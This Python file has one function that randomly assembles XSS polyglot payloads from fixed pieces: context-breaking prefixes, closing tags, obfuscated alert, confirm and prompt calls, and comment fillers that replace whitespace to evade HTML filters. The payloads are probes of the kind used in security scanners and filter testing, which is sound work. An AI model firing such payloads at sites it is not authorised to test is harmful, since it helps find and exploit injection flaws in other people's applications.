import random


def generate_polyglot():
    """
    generate a polyglot script
    """

    retval = ""
    starts = (
        "\"'>>javascript:-->", "<img//src='javascript://;alert()/>", "javascript: onclick=", "'\">><",
        "--><button javascript:/*", "/</title>--<button/>"
    )
    close_tags = (
        "</textarea></html></script></style>",
        "<xanxss></decoy></style></textarea>--></style>",
        "/<decoy></style-->/*</textarea>"
    )
    space_fillers = (
        "`-->", "'/*/*/*", "*//>", "//-->//", "-->//'*/",
        "/*``-->", '"-->//*/', "'String.fromCharCode(88,83,83)-->`/*"
    )
    tag_starters = (
        "<button src=`/*<script>", "<script><textarea><decoy><xanxss>",
        "<marquee<script>>", "<xanxss><script>"
    )
    prompts = (
        "confirm()",
        "(confirm)()", "co\u006efir\u006d()",
        "(prompt)``", "alert()"
    )
    script = [
        random.choice(starts),
        " <script>alert();</script>",
        random.choice(tag_starters),
        random.choice(prompts),
        random.choice(close_tags),
        " </script> "
    ]
    script = " ".join(script)
    for c in script:
        if c == " " or c.isspace():
            c = random.choice(space_fillers)
        retval += c
    return retval